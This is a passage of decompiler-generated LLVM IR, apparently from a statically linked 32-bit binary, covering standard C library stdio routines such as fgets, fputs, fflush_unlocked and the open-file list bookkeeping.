  store i32 %arg3, i32* @esi, align 4
  %v1_80518c2 = add i32 %arg3, 52
  %v2_80518c2 = inttoptr i32 %v1_80518c2 to i32*
  %v3_80518c2 = load i32, i32* %v2_80518c2, align 4
  store i32 %v3_80518c2, i32* @edi, align 4
  %v1_80518c5 = icmp eq i32 %v3_80518c2, 0
  %v1_80518c7 = icmp eq i1 %v1_80518c5, false
  br i1 %v1_80518c7, label %entry.dec_label_pc_80518e8_crit_edge, label %dec_label_pc_80518c9

entry.dec_label_pc_80518e8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80518e8

dec_label_pc_80518c9:                             ; preds = %entry
  %v1_80518c9 = add i32 %arg3, 56
  store i32 %v1_80518c9, i32* @ebx, align 4
  store i32 %v12_80518bb, i32* @eax, align 4
  %v2_80518d8 = call i32 @__pthread_return_void(i32 %v12_80518bb, i32 134562299)
  %v0_80518dd = load i32, i32* @ebx, align 4
  %v1_80518e0 = call i32 @__pthread_return_0(i32 %v0_80518dd)
  %v0_80518e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80518e8

dec_label_pc_80518e8:                             ; preds = %entry.dec_label_pc_80518e8_crit_edge, %dec_label_pc_80518c9
  %v0_80518e9 = phi i32 [ %arg3, %entry.dec_label_pc_80518e8_crit_edge ], [ %v0_80518e9.pre, %dec_label_pc_80518c9 ]
  %v0_80518e8 = load i32, i32* @edx, align 4
  %v4_80518f2 = inttoptr i32 %arg1 to i8*
  %v5_80518f2 = call i32 @__GI_fgets_unlocked(i8* %v4_80518f2, i32 %arg2, i32 %v0_80518e9, i32 %v0_80518e8)
  store i32 %v5_80518f2, i32* %ebx.global-to-local, align 4
  br i1 %v1_80518c7, label %dec_label_pc_8051911, label %dec_label_pc_8051900

dec_label_pc_8051900:                             ; preds = %dec_label_pc_80518e8
  store i32 %v12_80518bb, i32* @eax, align 4
  %v2_8051909 = call i32 @__pthread_return_void(i32 %v12_80518bb, i32 1)
  %v0_8051914.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051911

dec_label_pc_8051911:                             ; preds = %dec_label_pc_80518e8, %dec_label_pc_8051900
  %v0_8051914 = phi i32 [ %v5_80518f2, %dec_label_pc_80518e8 ], [ %v0_8051914.pre, %dec_label_pc_8051900 ]
  store i32 %v0_80518ba, i32* @ebx, align 4
  store i32 %v0_80518b9, i32* @esi, align 4
  store i32 %v0_80518b8, i32* @edi, align 4
  ret i32 %v0_8051914

; uselistorder directives
  uselistorder i32 %v12_80518bb, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051911, { 1, 0 }
  uselistorder label %dec_label_pc_80518e8, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805191c = load i32, i32* @edi, align 4
  %v0_805191d = load i32, i32* @esi, align 4
  %v0_805191e = load i32, i32* @ebx, align 4
  %v12_805191f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_8051926 = add i32 %arg2, 52
  %v2_8051926 = inttoptr i32 %v1_8051926 to i32*
  %v3_8051926 = load i32, i32* %v2_8051926, align 4
  store i32 %v3_8051926, i32* @edi, align 4
  %v1_8051929 = icmp eq i32 %v3_8051926, 0
  %v1_805192b = icmp eq i1 %v1_8051929, false
  br i1 %v1_805192b, label %entry.dec_label_pc_805194c_crit_edge, label %dec_label_pc_805192d

entry.dec_label_pc_805194c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805194c

dec_label_pc_805192d:                             ; preds = %entry
  %v1_805192d = add i32 %arg2, 56
  store i32 %v1_805192d, i32* @ebx, align 4
  store i32 %v12_805191f, i32* @eax, align 4
  %v2_805193c = call i32 @__pthread_return_void(i32 %v12_805191f, i32 134562299)
  %v0_8051941 = load i32, i32* @ebx, align 4
  %v1_8051944 = call i32 @__pthread_return_0(i32 %v0_8051941)
  %v0_805194e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805194c

dec_label_pc_805194c:                             ; preds = %entry.dec_label_pc_805194c_crit_edge, %dec_label_pc_805192d
  %v0_805194e = phi i32 [ %arg2, %entry.dec_label_pc_805194c_crit_edge ], [ %v0_805194e.pre, %dec_label_pc_805192d ]
  %v0_805194c = load i32, i32* @edx, align 4
  %v4_8051953 = inttoptr i32 %arg1 to i8*
  %v5_8051953 = call i32 @__GI_fputs_unlocked(i8* %v4_8051953, i32 %v0_805194e, i32 %v0_805194c, i32 %v0_805194c)
  store i32 %v5_8051953, i32* %ebx.global-to-local, align 4
  br i1 %v1_805192b, label %dec_label_pc_8051972, label %dec_label_pc_8051961

dec_label_pc_8051961:                             ; preds = %dec_label_pc_805194c
  store i32 %v12_805191f, i32* @eax, align 4
  %v2_805196a = call i32 @__pthread_return_void(i32 %v12_805191f, i32 1)
  %v0_8051975.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051972

dec_label_pc_8051972:                             ; preds = %dec_label_pc_805194c, %dec_label_pc_8051961
  %v0_8051975 = phi i32 [ %v5_8051953, %dec_label_pc_805194c ], [ %v0_8051975.pre, %dec_label_pc_8051961 ]
  store i32 %v0_805191e, i32* @ebx, align 4
  store i32 %v0_805191d, i32* @esi, align 4
  store i32 %v0_805191c, i32* @edi, align 4
  ret i32 %v0_8051975

; uselistorder directives
  uselistorder i32 %v12_805191f, { 2, 3, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051972, { 1, 0 }
  uselistorder label %dec_label_pc_805194c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_805198b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805198b, i32* @eax, align 4
  %v2_8051990 = call i32 @__pthread_return_void(i32 %v2_805198b, i32 134562299)
  %v1_805199c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  %v0_80519a1 = load i32, i32* @global_var_80665a4.702, align 4
  %v8_80519a9 = icmp eq i32 %v0_80519a1, 1
  %v1_80519aa = icmp eq i1 %v8_80519a9, false
  br i1 %v1_80519aa, label %dec_label_pc_8051a41, label %dec_label_pc_80519b0

dec_label_pc_80519b0:                             ; preds = %entry
  %v0_80519b0 = load i32, i32* @global_var_80665a8.703, align 8
  %tmp29 = icmp slt i32 %v0_80519b0, 1
  br i1 %tmp29, label %dec_label_pc_8051a41, label %dec_label_pc_80519bd

dec_label_pc_80519bd:                             ; preds = %dec_label_pc_80519b0
  store i32 0, i32* @esi, align 4
  %v2_80519ca = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80519ca, i32* @eax, align 4
  %v2_80519cf = call i32 @__pthread_return_void(i32 %v2_80519ca, i32 134562299)
  %v1_80519db = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80622f0.705 to i32))
  %v0_80519e0 = load i32, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  store i32 %v0_80519e0, i32* %edx.global-to-local, align 4
  %v1_8051a223 = icmp eq i32 %v0_80519e0, 0
  %v1_8051a2410 = icmp eq i1 %v1_8051a223, false
  br i1 %v1_8051a2410, label %dec_label_pc_80519eb, label %dec_label_pc_8051a26

dec_label_pc_80519eb:                             ; preds = %dec_label_pc_80519bd, %dec_label_pc_8051a20
  %v1_80519eb14.in = phi i32 [ %v0_8051a20, %dec_label_pc_8051a20 ], [ %v0_80519e0, %dec_label_pc_80519bd ]
  %v1_80519eb14 = inttoptr i32 %v1_80519eb14.in to i16*
  %v2_80519eb = load i16, i16* %v1_80519eb14, align 2
  %v1_80519ee = add i32 %v1_80519eb14.in, 32
  %v2_80519ee = inttoptr i32 %v1_80519ee to i32*
  %v3_80519ee = load i32, i32* %v2_80519ee, align 4
  store i32 %v3_80519ee, i32* @ebx, align 4
  %v1_80519f1 = and i16 %v2_80519eb, -32720
  %v6_80519f6 = icmp eq i16 %v1_80519f1, 48
  br i1 %v6_80519f6, label %dec_label_pc_80519ff, label %dec_label_pc_80519fb

dec_label_pc_80519fb:                             ; preds = %dec_label_pc_80519eb
  store i32 %v1_80519eb14.in, i32* @esi, align 4
  br label %dec_label_pc_8051a20

dec_label_pc_80519ff:                             ; preds = %dec_label_pc_80519eb
  %v0_80519ff = load i32, i32* @esi, align 4
  %v1_80519ff = icmp eq i32 %v0_80519ff, 0
  %v1_8051a01 = icmp eq i1 %v1_80519ff, false
  br i1 %v1_8051a01, label %dec_label_pc_8051a0b, label %dec_label_pc_8051a03

dec_label_pc_8051a03:                             ; preds = %dec_label_pc_80519ff
  store i32 %v3_80519ee, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  br label %dec_label_pc_8051a0e

dec_label_pc_8051a0b:                             ; preds = %dec_label_pc_80519ff
  %v2_8051a0b = add i32 %v0_80519ff, 32
  %v3_8051a0b = inttoptr i32 %v2_8051a0b to i32*
  store i32 %v3_80519ee, i32* %v3_8051a0b, align 4
  %v0_8051a0e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051a0e

dec_label_pc_8051a0e:                             ; preds = %dec_label_pc_8051a03, %dec_label_pc_8051a0b
  %v0_8051a17 = phi i32 [ %v1_80519eb14.in, %dec_label_pc_8051a03 ], [ %v0_8051a0e.pre, %dec_label_pc_8051a0b ]
  %v1_8051a0e = add i32 %v0_8051a17, 1
  %v2_8051a0e = inttoptr i32 %v1_8051a0e to i8*
  %v3_8051a0e = load i8, i8* %v2_8051a0e, align 1
  %v4_8051a0e = and i8 %v3_8051a0e, 32
  %v5_8051a0e = icmp eq i8 %v4_8051a0e, 0
  br i1 %v5_8051a0e, label %dec_label_pc_8051a20, label %dec_label_pc_8051a14

dec_label_pc_8051a14:                             ; preds = %dec_label_pc_8051a0e
  %v1_8051a18 = call i32 @free(i32 %v0_8051a17)
  br label %dec_label_pc_8051a20

dec_label_pc_8051a20:                             ; preds = %dec_label_pc_8051a0e, %dec_label_pc_80519fb, %dec_label_pc_8051a14
  %v0_8051a20 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a20, i32* %edx.global-to-local, align 4
  %v1_8051a22 = icmp eq i32 %v0_8051a20, 0
  %v1_8051a24 = icmp eq i1 %v1_8051a22, false
  br i1 %v1_8051a24, label %dec_label_pc_80519eb, label %dec_label_pc_8051a26

dec_label_pc_8051a26:                             ; preds = %dec_label_pc_8051a20, %dec_label_pc_80519bd
  store i32 %v2_80519ca, i32* @eax, align 4
  %v2_8051a2f = call i32 @__pthread_return_void(i32 %v2_80519ca, i32 1)
  store i32 0, i32* @global_var_80665a8.703, align 8
  %v0_8051a41.pre = load i32, i32* @global_var_80665a4.702, align 4
  br label %dec_label_pc_8051a41

dec_label_pc_8051a41:                             ; preds = %dec_label_pc_80519b0, %entry, %dec_label_pc_8051a26
  %v0_8051a41 = phi i32 [ %v0_80519a1, %dec_label_pc_80519b0 ], [ %v0_80519a1, %entry ], [ %v0_8051a41.pre, %dec_label_pc_8051a26 ]
  %v1_8051a46 = add i32 %v0_8051a41, -1
  store i32 %v1_8051a46, i32* @global_var_80665a4.702, align 4
  store i32 %v2_805198b, i32* @eax, align 4
  %v2_8051a55 = call i32 @__pthread_return_void(i32 %v2_805198b, i32 1)
  ret i32 %v2_8051a55

; uselistorder directives
  uselistorder i32 %v0_8051a20, { 1, 2, 0 }
  uselistorder i32 %v1_80519eb14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80519a1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051a41, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a0e, { 1, 0 }
  uselistorder label %dec_label_pc_80519eb, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8051a60 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_8051a63 = load i32, i32* @edi, align 4
  %v0_8051a64 = load i32, i32* @esi, align 4
  %v0_8051a65 = load i32, i32* @ebx, align 4
  %v4_8051a69 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051a69, i32* @ebx, align 4
  %v10_8051a6d = icmp eq i16* %arg1, inttoptr (i32 134619884 to i16*)
  br i1 %v10_8051a6d, label %dec_label_pc_8051a81, label %dec_label_pc_8051a75

dec_label_pc_8051a75:                             ; preds = %entry
  %v2_8051a75 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8051a7b = icmp eq i1 %v2_8051a75, false
  br i1 %v1_8051a7b, label %dec_label_pc_8051b79, label %dec_label_pc_8051a81

dec_label_pc_8051a81:                             ; preds = %dec_label_pc_8051a75, %entry
  store i32 0, i32* @edi, align 4
  %v2_8051a8e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051a8e, i32* @ebx, align 4
  %v2_8051a93 = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 134562299)
  %v1_8051a9f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  %v0_8051aa4 = load i32, i32* @global_var_80665a4.702, align 4
  store i32 ptrtoint (i32* @global_var_8062308.701 to i32), i32* @ecx, align 4
  %v1_8051aab = add i32 %v0_8051aa4, 1
  store i32 %v1_8051aab, i32* @eax, align 4
  store i32 %v1_8051aab, i32* @global_var_80665a4.702, align 4
  %v2_8051ab4 = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 1)
  store i32 %v2_8051ab4, i32* @eax, align 4
  %v2_8051ac7 = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 134562299)
  %v1_8051ad3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80622f0.705 to i32))
  %v0_8051ad8 = load i32, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  store i32 %v0_8051ad8, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_80622f0.705 to i32), i32* @eax, align 4
  %v2_8051ae3 = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 1)
  %v0_8051b6a1 = load i32, i32* @esi, align 4
  %v1_8051b6a2 = icmp eq i32 %v0_8051b6a1, 0
  %v1_8051b6c9 = icmp eq i1 %v1_8051b6a2, false
  br i1 %v1_8051b6c9, label %dec_label_pc_8051aed, label %dec_label_pc_8051b72

dec_label_pc_8051aed:                             ; preds = %dec_label_pc_8051a81, %dec_label_pc_8051b67
  %v0_8051afb = phi i32 [ %v3_8051b67, %dec_label_pc_8051b67 ], [ %v0_8051b6a1, %dec_label_pc_8051a81 ]
  %v1_8051aed = inttoptr i32 %v0_8051afb to i8*
  %v2_8051aed = load i8, i8* %v1_8051aed, align 1
  %v3_8051aed = and i8 %v2_8051aed, 64
  %v4_8051aed = icmp eq i8 %v3_8051aed, 0
  br i1 %v4_8051aed, label %dec_label_pc_8051b67, label %dec_label_pc_8051af2

dec_label_pc_8051af2:                             ; preds = %dec_label_pc_8051aed
  %v0_8051af2 = load i32, i32* @global_var_8062320.704, align 32
  %v9_8051af2 = icmp eq i32 %v0_8051af2, 2
  br i1 %v9_8051af2, label %dec_label_pc_8051b1a, label %dec_label_pc_8051afb

dec_label_pc_8051afb:                             ; preds = %dec_label_pc_8051af2
  %v1_8051afb = add i32 %v0_8051afb, 56
  store i32 %v1_8051afb, i32* @ebx, align 4
  store i32 %v2_8051a8e, i32* @eax, align 4
  %v2_8051b0a = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 134562299)
  %v0_8051b0f = load i32, i32* @ebx, align 4
  %v1_8051b12 = call i32 @__pthread_return_0(i32 %v0_8051b0f)
  %v0_8051b1a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051b1a

dec_label_pc_8051b1a:                             ; preds = %dec_label_pc_8051af2, %dec_label_pc_8051afb
  %v0_8051b2d = phi i32 [ %v0_8051afb, %dec_label_pc_8051af2 ], [ %v0_8051b1a.pre, %dec_label_pc_8051afb ]
  %v1_8051b1a = inttoptr i32 %v0_8051b2d to i32*
  %v2_8051b1a = load i32, i32* %v1_8051b1a, align 4
  %v1_8051b1c = load i32, i32* @ebp, align 4
  %v2_8051b1c = or i32 %v1_8051b1c, %v2_8051b1a
  %v1_8051b1e = and i32 %v2_8051b1c, 832
  %v2_8051b23 = icmp eq i32 %v1_8051b1e, 320
  %v1_8051b28 = icmp eq i1 %v2_8051b23, false
  br i1 %v1_8051b28, label %dec_label_pc_8051b4d, label %dec_label_pc_8051b2a

dec_label_pc_8051b2a:                             ; preds = %dec_label_pc_8051b1a
  %v1_8051b2e = call i32 @__stdio_wcommit(i32 %v0_8051b2d)
  %v1_8051b36 = icmp eq i32 %v1_8051b2e, 0
  br i1 %v1_8051b36, label %dec_label_pc_8051b3f, label %dec_label_pc_8051b3a

dec_label_pc_8051b3a:                             ; preds = %dec_label_pc_8051b2a
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8051b4d

dec_label_pc_8051b3f:                             ; preds = %dec_label_pc_8051b2a
  %v0_8051b3f = load i32, i32* @esi, align 4
  %v1_8051b3f = add i32 %v0_8051b3f, 8
  %v2_8051b3f = inttoptr i32 %v1_8051b3f to i32*
  %v3_8051b3f = load i32, i32* %v2_8051b3f, align 4
  %v2_8051b42 = add i32 %v0_8051b3f, 28
  %v3_8051b42 = inttoptr i32 %v2_8051b42 to i32*
  store i32 %v3_8051b3f, i32* %v3_8051b42, align 4
  %v0_8051b45 = load i32, i32* @esi, align 4
  %v1_8051b45 = inttoptr i32 %v0_8051b45 to i32*
  %v2_8051b45 = load i32, i32* %v1_8051b45, align 4
  %v2_8051b45.tr = trunc i32 %v2_8051b45 to i16
  %v1_8051b4a = and i16 %v2_8051b45.tr, -65
  %v3_8051b4a = inttoptr i32 %v0_8051b45 to i16*
  store i16 %v1_8051b4a, i16* %v3_8051b4a, align 2
  br label %dec_label_pc_8051b4d

dec_label_pc_8051b4d:                             ; preds = %dec_label_pc_8051b1a, %dec_label_pc_8051b3a, %dec_label_pc_8051b3f
  %v0_8051b4d = load i32, i32* @global_var_8062320.704, align 32
  %v9_8051b4d = icmp eq i32 %v0_8051b4d, 2
  br i1 %v9_8051b4d, label %dec_label_pc_8051b67, label %dec_label_pc_8051b56

dec_label_pc_8051b56:                             ; preds = %dec_label_pc_8051b4d
  store i32 %v2_8051a8e, i32* @eax, align 4
  %v2_8051b5f = call i32 @__pthread_return_void(i32 %v2_8051a8e, i32 1)
  br label %dec_label_pc_8051b67

dec_label_pc_8051b67:                             ; preds = %dec_label_pc_8051b4d, %dec_label_pc_8051aed, %dec_label_pc_8051b56
  %v0_8051b67 = load i32, i32* @esi, align 4
  %v1_8051b67 = add i32 %v0_8051b67, 32
  %v2_8051b67 = inttoptr i32 %v1_8051b67 to i32*
  %v3_8051b67 = load i32, i32* %v2_8051b67, align 4
  store i32 %v3_8051b67, i32* @esi, align 4
  %v1_8051b6a = icmp eq i32 %v3_8051b67, 0
  %v1_8051b6c = icmp eq i1 %v1_8051b6a, false
  br i1 %v1_8051b6c, label %dec_label_pc_8051aed, label %dec_label_pc_8051b72

dec_label_pc_8051b72:                             ; preds = %dec_label_pc_8051b67, %dec_label_pc_8051a81
  %v0_8051b72 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8051ba3

dec_label_pc_8051b79:                             ; preds = %dec_label_pc_8051a75
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8051b7b = load i8, i8* %tmp23, align 1
  %v4_8051b7b = and i8 %v3_8051b7b, 64
  %v5_8051b7b = icmp eq i8 %v4_8051b7b, 0
  br i1 %v5_8051b7b, label %dec_label_pc_8051ba3, label %dec_label_pc_8051b80

dec_label_pc_8051b80:                             ; preds = %dec_label_pc_8051b79
  store i32 -1, i32* @edi, align 4
  %v1_8051b87 = call i32 @__stdio_wcommit(i32 %v4_8051a69)
  %v1_8051b8f = icmp eq i32 %v1_8051b87, 0
  %v1_8051b91 = icmp eq i1 %v1_8051b8f, false
  br i1 %v1_8051b91, label %dec_label_pc_8051ba3, label %dec_label_pc_8051b93

dec_label_pc_8051b93:                             ; preds = %dec_label_pc_8051b80
  %v2_8051b93 = add i32 %v4_8051a69, 8
  %v3_8051b93 = inttoptr i32 %v2_8051b93 to i32*
  %v4_8051b93 = load i32, i32* %v3_8051b93, align 4
  store i32 0, i32* @edi, align 4
  %v3_8051b98 = add i32 %v4_8051a69, 28
  %v4_8051b98 = inttoptr i32 %v3_8051b98 to i32*
  store i32 %v4_8051b93, i32* %v4_8051b98, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_8051b9b = load i32, i32* %tmp24, align 4
  %v3_8051b9b.tr = trunc i32 %v3_8051b9b to i16
  %v1_8051ba0 = and i16 %v3_8051b9b.tr, -65
  store i16 %v1_8051ba0, i16* %arg1, align 2
  br label %dec_label_pc_8051ba3

dec_label_pc_8051ba3:                             ; preds = %dec_label_pc_8051b80, %dec_label_pc_8051b79, %dec_label_pc_8051b72, %dec_label_pc_8051b93
  %v0_8051ba6 = load i32, i32* @edi, align 4
  store i32 %v0_8051a65, i32* @ebx, align 4
  store i32 %v0_8051a64, i32* @esi, align 4
  store i32 %v0_8051a63, i32* @edi, align 4
  store i32 %v0_8051a60, i32* @ebp, align 4
  ret i32 %v0_8051ba6

; uselistorder directives
  uselistorder i32 %v3_8051b67, { 1, 2, 0 }
  uselistorder i32 %v2_8051a8e, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_80622ec.706 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_80665a4.702, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8062308.701 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 4, 3, 1, 0, 5 }
  uselistorder label %dec_label_pc_8051ba3, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b67, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b4d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b1a, { 1, 0 }
  uselistorder label %dec_label_pc_8051aed, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051bb0 = load i32, i32* @ebp, align 4
  %v4_8051bbb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051bbb, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8051bbb, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8051c01.preheader, label %dec_label_pc_8051c0d

dec_label_pc_8051c01.preheader:                   ; preds = %entry
  %v1_8051c0119 = add i32 %arg2, -1
  %v8_8051c0123 = icmp eq i32 %v1_8051c0119, 0
  store i32 %v1_8051c0119, i32* @esi, align 4
  %v1_8051c0225 = icmp eq i1 %v8_8051c0123, false
  br i1 %v1_8051c0225, label %dec_label_pc_8051bcb, label %dec_label_pc_8051c04

dec_label_pc_8051bcb:                             ; preds = %dec_label_pc_8051c01.preheader, %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge.dec_label_pc_8051bcb_crit_edge
  %v0_8051bcb = phi i32 [ %v0_8051bcb.pre, %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge.dec_label_pc_8051bcb_crit_edge ], [ %arg3, %dec_label_pc_8051c01.preheader ]
  %v1_8051bcb = add i32 %v0_8051bcb, 16
  %v2_8051bcb = inttoptr i32 %v1_8051bcb to i32*
  %v3_8051bcb = load i32, i32* %v2_8051bcb, align 4
  store i32 %v3_8051bcb, i32* %eax.global-to-local, align 4
  %v2_8051bce = add i32 %v0_8051bcb, 24
  %v3_8051bce = inttoptr i32 %v2_8051bce to i32*
  %v4_8051bce = load i32, i32* %v3_8051bce, align 4
  %v10_8051bce = icmp ult i32 %v3_8051bcb, %v4_8051bce
  %v1_8051bd1 = icmp eq i1 %v10_8051bce, false
  br i1 %v1_8051bd1, label %dec_label_pc_8051be1, label %dec_label_pc_8051bd3

dec_label_pc_8051bd3:                             ; preds = %dec_label_pc_8051bcb
  %v1_8051bd3 = inttoptr i32 %v3_8051bcb to i8*
  %v2_8051bd3 = load i8, i8* %v1_8051bd3, align 1
  %v3_8051bd3 = zext i8 %v2_8051bd3 to i32
  %v4_8051bd3 = load i32, i32* @edx, align 4
  %v5_8051bd3 = and i32 %v4_8051bd3, -256
  %v6_8051bd3 = or i32 %v5_8051bd3, %v3_8051bd3
  store i32 %v6_8051bd3, i32* @edx, align 4
  %v1_8051bd5 = add i32 %v3_8051bcb, 1
  store i32 %v1_8051bd5, i32* %eax.global-to-local, align 4
  %v2_8051bd6 = load i32, i32* @ebx, align 4
  %v3_8051bd6 = inttoptr i32 %v2_8051bd6 to i8*
  store i8 %v2_8051bd3, i8* %v3_8051bd6, align 1
  %v0_8051bd8 = load i32, i32* @ebx, align 4
  %v1_8051bd8 = add i32 %v0_8051bd8, 1
  store i32 %v1_8051bd8, i32* @ebx, align 4
  %v0_8051bd9 = load i32, i32* @edx, align 4
  %v1_8051bd9 = trunc i32 %v0_8051bd9 to i8
  %v10_8051bd9 = icmp eq i8 %v1_8051bd9, 10
  %v0_8051bdc = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bdc = load i32, i32* @ebp, align 4
  %v2_8051bdc = add i32 %v1_8051bdc, 16
  %v3_8051bdc = inttoptr i32 %v2_8051bdc to i32*
  store i32 %v0_8051bdc, i32* %v3_8051bdc, align 4
  br i1 %v10_8051bd9, label %dec_label_pc_8051c04, label %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge

dec_label_pc_8051be1:                             ; preds = %dec_label_pc_8051bcb
  %v0_8051be5 = call i32 @getc_unlocked()
  %v1_8051be5 = trunc i32 %v0_8051be5 to i8
  store i32 %v0_8051be5, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_8051be5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8051bf0 = icmp eq i1 %tmp, false
  br i1 %v1_8051bf0, label %dec_label_pc_8051bff, label %dec_label_pc_8051bf2

dec_label_pc_8051bf2:                             ; preds = %dec_label_pc_8051be1
  %v0_8051bf2 = load i32, i32* @ebp, align 4
  %v1_8051bf2 = inttoptr i32 %v0_8051bf2 to i8*
  %v2_8051bf2 = load i8, i8* %v1_8051bf2, align 1
  %v3_8051bf2 = and i8 %v2_8051bf2, 8
  %v4_8051bf2 = icmp eq i8 %v3_8051bf2, 0
  br i1 %v4_8051bf2, label %dec_label_pc_8051c04, label %dec_label_pc_8051c0d

dec_label_pc_8051bff:                             ; preds = %dec_label_pc_8051be1
  %v3_8051bfa = load i32, i32* @ebx, align 4
  %v4_8051bfa = inttoptr i32 %v3_8051bfa to i8*
  store i8 %v1_8051be5, i8* %v4_8051bfa, align 1
  %v0_8051bfc = load i32, i32* @ebx, align 4
  %v1_8051bfc = add i32 %v0_8051bfc, 1
  store i32 %v1_8051bfc, i32* @ebx, align 4
  %v11_8051bfd = icmp eq i8 %v1_8051be5, 10
  br i1 %v11_8051bfd, label %dec_label_pc_8051c04, label %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge

dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge: ; preds = %dec_label_pc_8051bd3, %dec_label_pc_8051bff
  %v0_8051c01.pre = load i32, i32* @esi, align 4
  %v1_8051c01 = add i32 %v0_8051c01.pre, -1
  %v8_8051c01 = icmp eq i32 %v1_8051c01, 0
  store i32 %v1_8051c01, i32* @esi, align 4
  %v1_8051c02 = icmp eq i1 %v8_8051c01, false
  br i1 %v1_8051c02, label %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge.dec_label_pc_8051bcb_crit_edge, label %dec_label_pc_8051c04

dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge.dec_label_pc_8051bcb_crit_edge: ; preds = %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge
  %v0_8051bcb.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051bcb

dec_label_pc_8051c04:                             ; preds = %dec_label_pc_8051c01.preheader, %dec_label_pc_8051bd3, %dec_label_pc_8051bff.dec_label_pc_8051c01_crit_edge, %dec_label_pc_8051bff, %dec_label_pc_8051bf2
  %v0_8051c04 = load i32, i32* @ebx, align 4
  %v1_8051c04 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_8051c04, %v1_8051c04
  br i1 %tmp27, label %dec_label_pc_8051c08, label %dec_label_pc_8051c0d

dec_label_pc_8051c08:                             ; preds = %dec_label_pc_8051c04
  %v1_8051c08 = inttoptr i32 %v0_8051c04 to i8*
  store i8 0, i8* %v1_8051c08, align 1
  %v0_8051c12.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c0f

dec_label_pc_8051c0d:                             ; preds = %dec_label_pc_8051c04, %dec_label_pc_8051bf2, %entry
  br label %dec_label_pc_8051c0f

dec_label_pc_8051c0f:                             ; preds = %dec_label_pc_8051c08, %dec_label_pc_8051c0d
